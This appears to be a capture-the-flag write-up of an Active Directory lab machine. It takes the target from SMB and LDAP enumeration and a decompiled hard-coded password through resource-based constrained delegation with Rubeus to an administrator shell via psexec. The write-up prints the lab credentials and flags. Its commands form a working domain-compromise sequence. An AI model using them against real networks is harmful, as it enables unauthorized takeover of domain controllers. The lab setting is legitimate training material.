System: Windows
Difficulty: Easy

IP Address: 10.129.230.181

# User Flag

Ports are enumerated.
```
sudo nmap 10.129.230.181 -sC -sV
```

Here are the results.
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-18 16:47:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Include this line in `/etc/hosts` file.
```
10.129.230.181	support.htb
```

Enumerating the shares.
```
smbclient -L \\\\10.129.230.181\\
```

The share `support-tools` looks interesting.
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share
```

A connection is made to the `support-tools` share and the suspicious file is downloaded.
```
smbclient \\\\10.129.230.181\\support-tools
```

```
smb: \> get UserInfo.exe.zip
```

After extracting the ZIP Folder, that binary is decompiled through ILSpy.
```
./ILSpy UserInfo.exe
```

A snipped of code decoding the password has been found through ILSpy.
```
internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}
```

Here is the decoded password according to the code.
```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

User enumeration is now attempted through these credentials.
```
netexec smb 10.129.230.181 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --rid-brute
```

A new user list has been obtained.
```
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
```

LDAP Enumeration is attempted through the same credentials.
```
ldapsearch -H ldap://10.129.230.181 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
```

An interesting output has been found.
```
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
```

New credentials has been obtained: `support:Ironside47pleasure40Watchful`
This user can now successfully connect through WinRM.
```
netexec winrm 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

WinRM Connection is attempted.
```
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

User Flag contents as in below.
```
8b8b12eaf361e61a20489883d3b07e4c
```

# Root Flag

Update the `/etc/hosts` file, since this is a Domain Controller.
```
10.129.230.181	support.htb dc.support.htb
```

Dump the Bloodhound Analysis files into the attacker machine.
```
bloodhound-ce-python -u support -p 'Ironside47pleasure40Watchful' -ns 10.129.230.181 -d support.htb -c All --zip
```

On Bloodhound, it is possible to see that the user `support` has access to the Domain Controller through `GenericAll` privileges, which can be exploited.
![[support_1.png]]

Exploitation steps are followed according to BloodHound.
```
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

```
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

```
.\Rubeus.exe hash /password:Summer2018!
```

After executing this command, a Base64 `ticket.kirbi` contents is generated.
```
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt
```

Convert the Base64 String into the `ticket.kirbi` format.
```
cat ticket.b64 | base64 -d > ticket.kirbi
```

Then convert it through `ticketconverter` to ccache format.
```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

Connect Successfully through PSExec with the New Ticket.
```
KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
```

Root Flag contents is in below.
```
4617b12327a93841cd37110a945ff604
```